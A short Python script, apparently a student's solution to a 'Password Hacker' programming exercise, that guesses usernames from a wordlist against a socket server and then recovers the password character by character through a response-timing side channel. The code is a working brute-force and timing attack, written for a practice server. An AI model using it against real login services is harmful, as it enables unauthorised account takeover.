import string
import sys
import socket
import json
import time

args = sys.argv
address = (args[1], int(args[2]))

logins = open('C:\\Users\\shesl\\PycharmProjects\\Password Hacker\\Password Hacker\\task\\hacking\\logins.txt', 'r')

client_socket = socket.socket()
client_socket.connect(address)

logon_msg = {"login": '', "password": ' '}

# Find login
for line in logins:

    line = line.strip('\n')
    logon_msg["login"] = line
    logon_msg_json = json.dumps(logon_msg, indent=4)
    logon_msg_bytes = logon_msg_json.encode()

    client_socket.send(logon_msg_bytes)

    response_json = client_socket.recv(1024).decode()
    response = json.loads(response_json)
    if response["result"] == "Wrong password!":
        break

# Find password
chars = list(string.ascii_lowercase + string.ascii_uppercase) + [str(d) for d in range(10)]
flag = True
pwd = ''

while flag:

    for char in chars:
        logon_msg["password"] = pwd + char
        logon_msg_json = json.dumps(logon_msg, indent=4)
        logon_msg_bytes = logon_msg_json.encode()

        client_socket.send(logon_msg_bytes)

        start = time.perf_counter()

        response_json = client_socket.recv(1024).decode()
        response = json.loads(response_json)

        end = time.perf_counter()
        response_time = end - start

        if response["result"] == "Wrong password!" and response_time >= 0.1:
            pwd = logon_msg['password']
            break
        elif response["result"] == "Connection success!":
            print(logon_msg_json)
            flag = False
            break

logins.close()
client_socket.close()
